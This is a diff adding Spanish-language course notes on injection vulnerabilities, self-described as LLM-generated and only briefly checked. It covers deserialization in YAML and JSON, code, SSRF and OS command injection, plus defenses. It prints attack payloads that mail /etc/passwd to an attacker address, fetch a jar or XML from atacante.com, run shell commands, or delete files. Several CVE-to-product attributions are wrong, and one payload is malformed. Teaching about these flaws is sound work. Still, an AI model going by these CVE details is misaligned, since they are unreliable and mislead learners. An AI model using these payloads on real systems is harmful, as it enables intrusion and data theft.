@@ -1,0 +1,373 @@
+* ¿Qué es este archivo?
+
+Si bien lo tengo desarrollado en el texto que hemos ido siguiendo, creo que
+el tema de inyecciones “gana” mucho de estar vinculado a ejemplos. El texto
+a continuación es generado por LLM, y si bien verifiqué rápidamente su
+validez... bueno, me arriesgo a meterme el pie yo solito 😉 Estamos todos
+advertidos...
+
+* Inyecciones
+
+** Inyección de Objetos (Object Injection)
+
+*Descripción*: Esta vulnerabilidad surge cuando una aplicación deserializa
+(reconstruye a partir de una cadena de texto) datos no confiables sin la
+validación adecuada. Un atacante puede manipular el flujo de ejecución de
+la aplicación proporcionando un objeto serializado malicioso. Al
+deserializarlo, la aplicación ejecuta automáticamente métodos específicos
+de ese objeto (como __wakeup() en PHP o readObject() en Java), lo que puede
+llevar a la ejecución de código arbitrario, inclusión de archivos o
+escalada de privilegios. Es un ataque que convierte datos en código
+ejecutable.
+
+- [[https://nvd.nist.gov/vuln/detail/CVE-2022-22963][CVE-2022-22963]] (CVSS 9.8) :: En Spring Cloud Function, la inyección de
+  objetos a través del encabezado spring.cloud.function.routing-expression
+  permitía la Ejecución Remota de Código (RCE).
+
+- [[https://nvd.nist.gov/vuln/detail/CVE-2017-9841][CVE-2017-9841]] (CVSS 9.8) :: En PHPUnit (utilizado en entornos de
+  producción por error), una vulnerabilidad de deserialización insegura
+  permitía la ejecución de código PHP arbitrario.
+
+- [[https://nvd.nist.gov/vuln/detail/CVE-2015-7450][CVE-2015-7450]] (CVSS 7.5) :: Una deserialización insegura en IBM WebSphere
+  Application Server permitía a un atacante ejecutar código Java
+  arbitrario.
+
+(algunos ejemplos específicos de inyección en serializaciones vía JSON o
+YAML más adelante)
+
+** Inyección de Código (Code Injection)
+
+*Descripción*: Ocurre cuando un atacante logra inyectar y ejecutar código
+en un lenguaje interpretado del lado del servidor (como PHP, Python,
+Perl). A diferencia de la deserialización, aquí el código se inyecta
+directamente en una sentencia o función que lo evalúa dinámicamente (ej:
+eval(), system(), exec()). La aplicación trata la entrada del usuario como
+parte del código a ejecutar. El impacto suele ser la ejecución directa de
+comandos del sistema operativo o código de aplicación con los privilegios
+del servidor.
+
+- [[https://nvd.nist.gov/vuln/detail/CVE-2023-29489][CVE-2023-29489]] (CVSS 9.8) :: En cPanel, una inyección de código a través
+  del parámetro api_call permitía a un usuario autenticado ejecutar
+  comandos arbitrarios en el sistema como root.
+
+- [[https://nvd.nist.gov/vuln/detail/CVE-2012-1823][CVE-2012-1823]] (CVSS 10.0) :: Una vulnerabilidad crítica en PHP-CGI donde
+  parámetros de consulta eran interpretados como argumentos de línea de
+  comandos, lo que permitía la inyección y ejecución de código remoto.
+
+- [[https://nvd.nist.gov/vuln/detail/CVE-2023-24078][CVE-2023-24078]] (CVSS 8.8) :: En symfony/serializer de Symfony, un
+  atacante podía lograr la ejecución de código PHP a través de la inyección
+  de una carga útil maliciosa.
+
+** Inyección de Solicitudes (SSRF - Server-Side Request Forgery)
+
+*Descripción*: Un atacante obliga a un servidor a realizar solicitudes HTTP
+a un destino de su elección. Esto explota la funcionalidad de la aplicación
+para recuperar URLs. Un SSRF exitoso puede usarse para:
+
+- Escaneo de redes internas: Acceder a sistemas internos que no son
+  accesibles desde Internet.
+
+- Ataques a servicios internos: Interactuar con servicios sin autenticación
+  (como paneles de administración de bases de datos o APIs internas).
+
+- Filtración de datos: Hacer que el servidor envíe datos sensibles a un
+  servidor controlado por el atacante.
+
+- [[https://nvd.nist.gov/vuln/detail/CVE-2021-29472][CVE-2021-29472]] (CVSS 7.7) :: En el servidor de medios url-get.php de
+  WordPress, un atacante podía realizar solicitudes a servicios internos y
+  leer respuestas, lo que podía llevar a la exposición de credenciales.
+
+- [[https://nvd.nist.gov/vuln/detail/CVE-2019-8442][CVE-2019-8442]] (CVSS 6.4) :: En Jira, un endpoint de la API permitía a un
+  atacante realizar una solicitud SSRF que revelaba información sobre
+  servicios internos.
+
+- [[https://nvd.nist.gov/vuln/detail/CVE-2023-38500][CVE-2023-38500]] (CVSS 7.5) :: En la aplicación MinIO, una vulnerabilidad
+  SSRF de alta severidad permitía a los atacantes ejecutar comandos
+  arbitrarios en el entorno de gestión.
+
+** Inyección de Comandos del Sistema Operativo (OS Command Injection)
+
+*Descripción*: Es uno de los tipos de inyección los más críticos. Ocurre
+cuando una aplicación pasa datos no confiables (provenientes del usuario)
+directamente a un shell del sistema operativo sin la validación o escapado
+adecuado. Un atacante puede engañar a la aplicación para que ejecute
+comandos del sistema operativo arbitrarios con los mismos privilegios que
+la propia aplicación. El impacto suele ser la total compromisión del
+servidor.
+
+CVEs de Ejemplo:
+
+- [[https://nvd.nist.gov/vuln/detail/CVE-2022-46169][CVE-2022-46169]] (CVSS 9.8) :: Inyección de comandos en la función
+  remote_agent.php de Cacti que permitía ejecución remota de código sin
+  autenticación: No validaba adecuadamente el encabezado HTTP_HOST antes de
+  pasarlo a funciones del sistema.
+
+- [[https://nvd.nist.gov/vuln/detail/CVE-2023-27326][CVE-2023-27326]] (CVSS 9.8) :: Inyección de comandos en PaperCut NG que
+  permitía a atacantes no autenticados ejecutar código arbitrario por
+  entradas de usuario pasadas directamente a procesos del sistema
+  operativo.
+
+- [[https://nvd.nist.gov/vuln/detail/CVE-2021-4034][CVE-2021-4034]] (CVSS 7.8) :: Mientras es principalmente un desbordamiento,
+  el resultado final es la ejecución de comandos del sistema como root en
+  polkit, mediante la explotación de variables de entorno para ejecutar
+  código arbitrario.
+
+* Mecanismo de la Inyección de Objetos en YAML
+
+YAML es un formato de serialización muy potente que no solo describe datos,
+sino que puede instanciar objetos arbitrarios y invocar funciones durante
+el proceso de deserialización. Esto se hace a través de etiquetas
+específicas como =!!python/object= o =!!python/object/apply=.
+
+Cuando un parser de YAML (como PyYAML en Python o snakeyaml en Java)
+procesa un documento con estas etiquetas sin las debidas restricciones,
+crea los objetos y ejecuta las funciones especificadas, lo que puede llevar
+directamente a la Ejecución Remota de Código (RCE).  [[https://nvd.nist.gov/vuln/detail/CVE-2017-17522][CVE-2017-17522]] - RCE
+en PyYAML
+
+Descripción: Una vulnerabilidad de Ejecución Remota de Código en el parser
+PyYAML a través de la etiqueta python/object/new. Un atacante capaz de
+proporcionar un archivo YAML malicioso a una aplicación que use yaml.load()
+(en lugar de yaml.safe_load()) puede lograr la ejecución de comandos
+arbitrarios en el sistema.
+
+Payload de Ejemplo:
+
+#+begin_src yaml
+!!python/object/new:os.system
+args: ['cat /etc/passwd | mail atacante@malicioso.com']
+#+end_src
+
+- =!!python/object/new:os.system= instruye al parser a crear una nueva
+  instancia de la clase os.system.
+
+- =args= Proporciona los argumentos para el constructor. En este caso, el
+  comando a ejecutar.
+
+*Escenario de Ataque*
+
+- Una aplicación web permite a los usuarios subir un archivo de
+  configuración en YAML.
+
+- La aplicación procesa el archivo con =yaml.load(file_content)=.
+
+- Un atacante sube un archivo YAML con el payload mostrado arriba.
+
+- Al deserializarlo, el sistema ejecuta el comando =cat /etc/passwd=.
+
+[[https://nvd.nist.gov/vuln/detail/CVE-2022-1471][CVE-2022-1471]] - RCE en SnakeYAML (Java)
+
+Descripción: SnakeYAML, el parser de YAML más popular para Java, es
+vulnerable a la Deserialización Insegura cuando se instancia con la
+configuración por defecto (usando new Yaml()). Un atacante puede lograr RCE
+aprovechando constructores de clases disponibles en el classpath.
+
+Payload de Ejemplo (Generación de un ScriptEngine de Java):
+
+#+begin_src yaml
+!!javax.script.ScriptEngineManager [
+  !!java.net.URLClassLoader [[
+    !!java.net.URL ["http://atacante.com/malicioso.jar"]
+  ]]
+]
+#+end_src
+
+Este payload es más complejo y suele ser el primer paso. A menudo, los
+atacantes utilizan una cadena de gadgets conocidos para lograr RCE de forma
+más directa. Un payload más común y explícito para RCE sería uno que
+aproveche una clase como
+=org.springframework.context.support.ClassPathXmlApplicationContext= para
+cargar un contexto XML malicioso desde una URL controlada por el atacante,
+lo que luego lleva a la ejecución de código.
+
+Payload Alternativo y Común (si =Spring= está en el classpath):
+
+#+begin_src yaml
+!!org.springframework.context.support.ClassPathXmlApplicationContext
+arg: http://atacante.com/context.xml
+#+end_src
+
+El archivo =context.xml= contendría entonces beans maliciosos que ejecutan
+código.
+
+*Escenario de Ataque*
+
+- Una aplicación Java (por ejemplo, un servicio Spring Boot que acepta
+  configuraciones en YAML) deserializa datos de usuario usando =new
+  Yaml().load()=.
+
+- El atacante envía un payload YAML malicioso como el de arriba.
+
+- SnakeYAML instancia la clase =ClassPathXmlApplicationContext= y carga el
+  XML remoto.
+
+- El XML malicioso define beans que ejecutan código Java arbitrario, dando
+  RCE al atacante.
+
+Ejemplo en el Mundo Real: [[https://nvd.nist.gov/vuln/detail/CVE-2022-1471][CVE-2022-1471]] en Acción
+
+Software Afectado: GitLab
+
+- CVE: [[https://nvd.nist.gov/vuln/detail/CVE-2023-2825][CVE-2023-2825]] (GitLab) se basó en la explotación de SnakeYAML
+  ([[https://nvd.nist.gov/vuln/detail/CVE-2022-1471][CVE-2022-1471]]).
+
+- Vector: Un usuario autenticado podía importar un proyecto a través de un
+  archivo que contenía un payload YAML malicioso.
+
+- Impacto: Ejecución Remota de Código en el servidor de GitLab.
+
+*Defensa Contra la Inyección de Objetos YAML*
+
+La mitigación es directa pero debe ser aplicada estrictamente:
+
+- Nunca usar =load()= sin restricciones. En PyYAML, usar
+  =yaml.safe_load()=. En SnakeYAML (Java), instanciar el parser con un
+  SafeConstructor restringido:
+  #+begin_src java
+  Yaml yaml = new Yaml(new SafeConstructor()); // ¡Seguro por defecto!
+  #+end_Src
+
+- Validar Estrictamente la Entrada: Si se debe usar una funcionalidad
+  potente, validar exhaustivamente el esquema y contenido del YAML antes de
+  deserializarlo.
+
+- Actualizar Bibliotecas: Mantener los parsers de YAML actualizados a
+  versiones que, por defecto, restrinjan la deserialización de tipos
+  arbitrarios.
+
+* Mecanismo de la inyección de Objetos en JSON
+
+A diferencia de YAML, JSON por sí mismo es un formato de sólo datos y no
+permite la ejecución de código de manera inherente. El peligro surge
+cuando:
+
+- Las aplicaciones usan parsers inseguros que extienden JSON con funcionalidades de instanciación de objetos.
+
+- Se utiliza eval() o funciones similares para procesar JSON.
+
+- La deserialización convierte propiedades JSON en objetos complejos sin validación.
+
+** Caso 1: JSONP y Callback Injection
+
+[[https://nvd.nist.gov/vuln/detail/CVE-2021-44906][CVE-2021-44906]] - dojo (JSONP Hijacking)
+
+- Mecanismo: JSONP (JSON with Padding) permite bypass de CORS usando callbacks. Si un endpoint JSONP acepta callback arbitrarios, se puede inyectar código JavaScript.
+
+- Payload:
+  #+begin_src javascript
+  http://api.vulnerable.com/userdata?callback=malicious_function
+  #+end_src
+
+- Impacto: Ejecución de código en el contexto del dominio, robo de datos sensibles.
+
+** Caso 2: Prototype Pollution vía JSON
+
+[[https://nvd.nist.gov/vuln/detail/CVE-2022-25647][CVE-2022-25647]] - node-forge
+
+- Mecanismo: Al mergear objetos JSON profundamente, se puede modificar el prototipo de Object en JavaScript.
+
+- Payload:
+  #+begin_src json
+  {
+    "__proto__": {
+      "isAdmin": true,
+      "polluted": "yes"
+    }
+  }
+  #+end_src
+
+- Impacto: Modificación de comportamiento de la aplicación, escalada de privilegios, RCE en combinación con otros gadgets.
+
+** Caso 3: Deserialización Insegura en Parsers Específicos
+
+[[https://nvd.nist.gov/vuln/detail/CVE-2022-25845][CVE-2022-25845]] - fast-json-parse
+
+- Mecanismo: Este parser permitía la ejecución de código a través de constructores especiales.
+
+- Payload:
+  #+begin_src json
+  {
+    "key": {"type": "Function", "value": "return process.exit(1)"}
+  }
+  #+end_src
+
+- Impacto: Denegación de servicio o ejecución de código arbitrario.
+
+** Caso 4: eval() de JSON sin Validar
+
+Ejemplo en Aplicaciones PHP:
+
+#+begin_src php
+// ¡VULNERABLE!
+$data = json_decode($_POST['data']);
+// Peor aún:
+$data = eval("return " . $_POST['data'] . ";");
+#+end_src
+
+Payload:
+#+begin_src javascript
+{"user": "admin", "password": "test"; system('rm -rf /'); //}
+#+end_src
+
+** CVEs Destacados de Inyección en JSON
+[[https://nvd.nist.gov/vuln/detail/CVE-2022-23529][CVE-2022-23529]] - node-serialize
+
+- Severidad: Crítica (CVSS 9.8)
+
+- Mecanismo: Usaba eval() para reconstruir funciones serializadas en JSON.
+
+- Payload:
+  #+begin_src json
+  {
+    "rce": {"_$$ND_FUNC$$_": "function(){ require('child_process').exec('cat /etc/passwd') }"}
+  }
+  #+end_src
+- Impacto: Ejecución remota de código inmediata.
+
+[[https://nvd.nist.gov/vuln/detail/CVE-2021-25949][CVE-2021-25949]] - underscore
+
+- Mecanismo: Template injection a través de manipulación de objetos JSON.
+
+- Payload:
+  #+begin_src json
+  {
+    "constructor": {
+      "prototype": {
+        "sourceURL": "\u000areturn process.mainModule.require('child_process').execSync('cat /etc/passwd')//"
+      }
+    }
+  }
+  #+end_src
+
+[[https://nvd.nist.gov/vuln/detail/CVE-2023-26117][CVE-2023-26117]] - mongodb library
+
+- Mecanismo: Inyección de operadores de consulta a través de JSON.
+
+- Payload:
+#+begin_src json
+{
+  "username": {"$ne": "invalid"},
+  "password": {"$ne": "invalid"}
+}
+#+end_src
+
+- Impacto: Bypass de autenticación NoSQL injection.
+
+Defensas Contra Inyección en JSON
+
+- Usar JSON.parse() nativo: Nunca usar eval() o parsers personalizados que ejecuten código.
+
+- Schema Validation: Validar estructura y tipos con JSON Schema antes de procesar.
+
+- Object Creation Safely: No instanciar objetos basados en propiedades JSON sin verificación.
+
+- Sanitización de Prototipos:
+  #+begin_src javascript
+  // Antes de procesar JSON
+  if (jsonData.hasOwnProperty('__proto__') || jsonData.hasOwnProperty('constructor')) {
+    throw new Error('Prototype pollution attempt');
+  }
+  #+end_src
+
+- Content-Type estricto: application/json sin interpretación como script.
+
